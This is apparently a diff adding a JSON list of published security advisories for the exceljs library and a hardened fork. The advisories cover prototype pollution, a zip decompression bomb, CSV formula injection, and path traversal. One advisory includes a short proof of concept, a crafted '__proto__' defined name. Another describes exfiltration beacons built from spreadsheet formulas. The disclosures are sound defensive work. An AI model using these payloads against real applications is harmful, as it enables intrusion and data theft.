+      "description": "### Summary\r\n\r\nLoading a crafted `.xlsx` pollutes `Object.prototype` for the whole Node.js process. No authentication is needed beyond the ability to submit a file to an application that calls `xlsx.load()`.\r\n\r\n### Details\r\n\r\nDefined names are expanded into a `CellMatrix`, which stores sheets in a plain object keyed by the sheet name found in the file.\r\n\r\nWith the sheet name `__proto__`, `this.sheets['__proto__']` resolves to `Object.prototype`, and the row and cell arrays are then written straight onto it.\r\n\r\nThe polluted keys are the row numbers of the range, each holding an empty array.\r\n\r\n### Proof of concept\r\n\r\nIn `xl/workbook.xml` of any valid workbook, add inside `<definedNames>`:\r\n\r\n```xml\r\n<definedName name=\"x\">__proto__!$A$1:$A$3</definedName>\r\n```\r\n\r\nThen:\r\n\r\n```js\r\nconst wb = new ExcelJS.Workbook();\r\nawait wb.xlsx.load(buffer);\r\n\r\nObject.keys(Object.prototype); // [ '1', '2', '3' ]\r\n({})[2];                       // []  (truthy)\r\n```\r\n\r\n### Impact\r\n\r\nEvery object in the process now inherits attacker-chosen numeric keys holding empty arrays.\r\n\r\nCode that tests `if (map[id])`, iterates with `for…in`, or relies on a key being absent can be broken or bypassed. The effect lasts until the process restarts.",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-pwgq-2cgg-6ph9",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-128336",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:47:44Z",
+      "published_at": "2026-10-16T16:00:26Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 5.0.2",
+          "patched_versions": "5.1.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": null
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:L/SC:N/SI:N/SA:N",
+          "score": 8.8
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1321"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      }
+    },
+    {
+      "ghsa_id": "GHSA-7cvf-3r55-r39q",
+      "cve_id": "CVE-2026-78206",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-7cvf-3r55-r39q",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-7cvf-3r55-r39q",
+      "summary": "Uncontrolled Resource Consumption in exceljs via `Workbook.xlsx.load()`",
+      "description": "### Impact\r\n\r\n`Workbook.xlsx.load()` (`lib/xlsx/xlsx.js`) decompresses every zip entry\r\nof an uploaded `.xlsx` fully into memory, with no limit on total size,\r\nper-entry size, or compression ratio. A small, highly-compressible file\r\n(a few hundred KB) can expand to gigabytes in memory before any XML is\r\nparsed.\r\n\r\nAny service that calls `load()`/`readFile()` on an untrusted or\r\nuser-uploaded file can be crashed by a single small upload. Measured:\r\na ~1.5MB crafted file expanding to ~1.5GB was enough to exceed a 512MB\r\ncontainer memory limit and get the process killed by the OOM killer.\r\n\r\n### Patches\r\n\r\nNot patched upstream. Patched in the unofficial fork\r\n`exceljs-hardened >= 5.0.0`, which reads each zip entry's declared\r\nuncompressed size from the archive's central directory before\r\ndecompressing it, and rejects the file if a single entry (128MB\r\ndefault) or the archive total (512MB default) exceeds a configurable\r\nlimit.\r\n\r\n### Workarounds\r\n\r\nRun `load()` inside a process/container with a hard memory limit so a\r\ncrash is contained, and/or pre-check the uploaded file's declared\r\nuncompressed sizes (from the zip central directory) before calling\r\n`load()`. Restricting upload file size alone is not sufficient — the\r\nfile on disk can be small.\r\n\r\n### References\r\n\r\n- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/decompression-guard.js`\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-7cvf-3r55-r39q",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-78206",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:57:55Z",
+      "published_at": "2026-08-23T16:47:46Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "5.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-409",
+          "name": "Improper Handling of Highly Compressed Data (Data Amplification)"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-409"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+        "score": 7.5
+      }
+    },
+    {
+      "ghsa_id": "GHSA-9wxc-4rhw-hfrw",
+      "cve_id": "CVE-2026-78209",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-9wxc-4rhw-hfrw",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-9wxc-4rhw-hfrw",
+      "summary": "CSV Formula Injection in exceljs via `CSV.write()`",
+      "description": "### Impact\r\n\r\n`CSV.write()` (`lib/csv/csv.js`) writes cell values to CSV output with\r\nno check for leading `=`, `+`, `-`, or `@` characters. A cell value\r\nstarting with one of them is interpreted as a live formula by Excel or\r\nLibreOffice Calc when the exported file is opened.\r\n\r\nAny application that exports user-influenced data to CSV via\r\n`workbook.csv.write()`/`writeBuffer()`/`writeFile()` can have that data\r\nweaponized against whoever opens the export — for example DDE-style\r\ncommand execution, or exfiltration of other cells in the same file via\r\n`HYPERLINK()`/`WEBSERVICE()` beacons to an attacker-controlled server.\r\nThe attacker does not need access to the exported file themselves; they\r\nonly need to influence one value that ends up in it.\r\n\r\n### Patches\r\n\r\nNot patched upstream. Patched in the unofficial fork\r\n`exceljs-hardened >= 5.0.0`, which prefixes values starting with\r\n`=`, `+`, `-`, `@`, tab, or CR with a neutralizing apostrophe before\r\nwriting them, on by default (`options.escapeFormulas`).\r\n\r\n### Workarounds\r\n\r\nSanitize values yourself before calling `workbook.csv.write()`: prefix\r\nany string beginning with `=`, `+`, `-`, `@`, tab, or CR with a single\r\nquote (`'`). Alternatively, avoid opening CSV exports of\r\nuser-influenced data directly in a spreadsheet application.\r\n\r\n### References\r\n\r\n- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/csv-formula-guard.js`\r\n- OWASP CSV Injection: https://owasp.org/www-community/attacks/CSV_Injection\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-9wxc-4rhw-hfrw",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-78209",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:59:50Z",
+      "published_at": "2026-08-23T16:48:02Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "5.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+          "score": 8.2
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1236",
+          "name": "Improper Neutralization of Formula Elements in a CSV File"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1236"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
+        "score": 8.2
+      }
+    },
+    {
+      "ghsa_id": "GHSA-m8mg-8574-gm3m",
+      "cve_id": "CVE-2026-78208",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-m8mg-8574-gm3m",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-m8mg-8574-gm3m",
+      "summary": "Path Traversal in exceljs via `Workbook.addImage({filename})`",
+      "description": "### Impact\r\n\r\n`Workbook.addImage({filename})` passes `filename` directly to\r\n`fs.readFile()` (`lib/xlsx/xlsx.js`, `addMedia()`) with no validation.\r\nThe library's own source flags this with a `// TODO: validation?`\r\ncomment.\r\n\r\nAn application that builds this path by joining a base directory with\r\na user-supplied fragment (e.g. selecting a logo/asset by name) is\r\nexposed to `../` traversal. Because `path.join()` resolves and strips\r\n`..` segments before the string reaches `addImage()`, checks performed\r\nafter the join cannot catch it — the containment check has to happen as\r\npart of the join itself.\r\n\r\nAny file readable by the Node.js process can be read this way and is\r\nreturned to the requester embedded inside a normal-looking `.xlsx`\r\ndownload (`xl/media/imageN.<ext>`).\r\n\r\n### Patches\r\n\r\nNot patched upstream. Patched in the unofficial fork\r\n`exceljs-hardened >= 5.0.0`, which adds `ExcelJS.utils.safeJoin(baseDir,\r\nuserInput)` — a replacement for `path.join()` that resolves and checks\r\ncontainment as a single operation — plus a secondary check in\r\n`addImage()`/`addMedia()` that rejects raw paths containing `..`.\r\n\r\n### Workarounds\r\n\r\nNever build an `addImage({filename})` path by joining a base directory\r\nwith user input via `path.join()` alone. Resolve the final path and\r\nverify it starts with the intended base directory before use, or map\r\nuser input to a fixed set of known-safe paths instead of accepting a\r\npath fragment.\r\n\r\n### References\r\n\r\n- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/media-path-guard.js`\r\n",
+      "severity": "high",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-m8mg-8574-gm3m",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-78208",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:59:18Z",
+      "published_at": "2026-08-23T16:48:18Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "5.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "score": 7.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory"
+        },
+        {
+          "cwe_id": "CWE-73",
+          "name": "External Control of File Name or Path"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-22",
+        "CWE-73"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+        "score": 7.5
+      }
+    },
+    {
+      "ghsa_id": "GHSA-qwr4-7h29-chpf",
+      "cve_id": "CVE-2026-78207",
+      "url": "https://api.github.com/repos/mateocallec/exceljs-hardened/security-advisories/GHSA-qwr4-7h29-chpf",
+      "html_url": "https://github.com/mateocallec/exceljs-hardened/security/advisories/GHSA-qwr4-7h29-chpf",
+      "summary": "Prototype Pollution in exceljs via `Note.model` / `_.deepMerge`",
+      "description": "### Impact\r\n\r\n`_.deepMerge()` (`lib/utils/under-dash.js`) merges objects without\r\nfiltering `__proto__`, `constructor`, or `prototype` keys. It is reached\r\nthrough `Note.prototype.get model()` whenever a workbook is serialized\r\nafter a cell's `.note` was set to a non-string value\r\n(`cell.note = <object>`).\r\n\r\nIf an application assigns user-controlled JSON to `cell.note` (a\r\nplausible pattern for a \"comment\" or \"annotation\" feature), a payload\r\ncontaining an own `\"__proto__\"` key — trivial via `JSON.parse`, which\r\ndoes not special-case that key the way an object literal does — reaches\r\nthe global `Object.prototype` and can set arbitrary properties on it.\r\nThis affects every plain object created afterward in the same process,\r\nnot just the request that sent the payload.\r\n\r\nConfirmed impact: an unrelated endpoint that builds a plain object and\r\ntrusts a property on it for an authorization decision (a common pattern)\r\ncan be made to return a different result after a single unauthenticated\r\nrequest, with no further interaction from the attacker.\r\n\r\n### Patches\r\n\r\nNot patched upstream. No maintained release of `exceljs` addresses this.\r\nPatched in the unofficial fork `exceljs-hardened >= 5.0.0`, which filters\r\n`__proto__`/`constructor`/`prototype` in `deepMerge()`.\r\n\r\n### Workarounds\r\n\r\nDo not pass unvalidated/parsed JSON directly into `cell.note`. If the\r\nvalue must come from user input, allow-list the expected keys\r\n(`texts`, `margins`, `protection`, `editAs`) before assigning it.\r\n\r\n### References\r\n\r\n- Fix: `exceljs-hardened` (https://github.com/mateocallec/exceljs-hardened), `lib/utils/under-dash.js`\r\n",
+      "severity": "critical",
+      "author": null,
+      "publisher": {
+        "login": "mateocallec",
+        "id": 130830331,
+        "node_id": "U_kgDOB8xP-w",
+        "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+        "gravatar_id": "",
+        "url": "https://api.github.com/users/mateocallec",
+        "html_url": "https://github.com/mateocallec",
+        "followers_url": "https://api.github.com/users/mateocallec/followers",
+        "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+        "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+        "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+        "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+        "repos_url": "https://api.github.com/users/mateocallec/repos",
+        "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+        "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+        "type": "User",
+        "user_view_type": "public",
+        "site_admin": false
+      },
+      "identifiers": [
+        {
+          "value": "GHSA-qwr4-7h29-chpf",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-78207",
+          "type": "CVE"
+        }
+      ],
+      "state": "published",
+      "created_at": null,
+      "updated_at": "2026-11-14T17:58:46Z",
+      "published_at": "2026-08-23T16:48:25Z",
+      "closed_at": null,
+      "withdrawn_at": null,
+      "submission": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "",
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "npm",
+            "name": "exceljs-hardened"
+          },
+          "vulnerable_version_range": "<= 4.4.0",
+          "patched_versions": "5.0.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score": 9.8
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": null
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-1321",
+          "name": "Improperly Controlled Modification of Object Prototype Attributes"
+        }
+      ],
+      "cwe_ids": [
+        "CWE-1321"
+      ],
+      "credits": [
+        {
+          "login": "mateocallec",
+          "type": "finder"
+        }
+      ],
+      "credits_detailed": [
+        {
+          "user": {
+            "login": "mateocallec",
+            "id": 130830331,
+            "node_id": "U_kgDOB8xP-w",
+            "avatar_url": "https://avatars.githubusercontent.com/u/130830331?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mateocallec",
+            "html_url": "https://github.com/mateocallec",
+            "followers_url": "https://api.github.com/users/mateocallec/followers",
+            "following_url": "https://api.github.com/users/mateocallec/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mateocallec/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mateocallec/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mateocallec/subscriptions",
+            "organizations_url": "https://api.github.com/users/mateocallec/orgs",
+            "repos_url": "https://api.github.com/users/mateocallec/repos",
+            "events_url": "https://api.github.com/users/mateocallec/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mateocallec/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "finder",
+          "state": "accepted"
+        }
+      ],
+      "collaborating_users": null,
+      "collaborating_teams": null,
+      "private_fork": null,
+      "comments": 0,
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 9.8
+      }
+    }
+  ]
+}
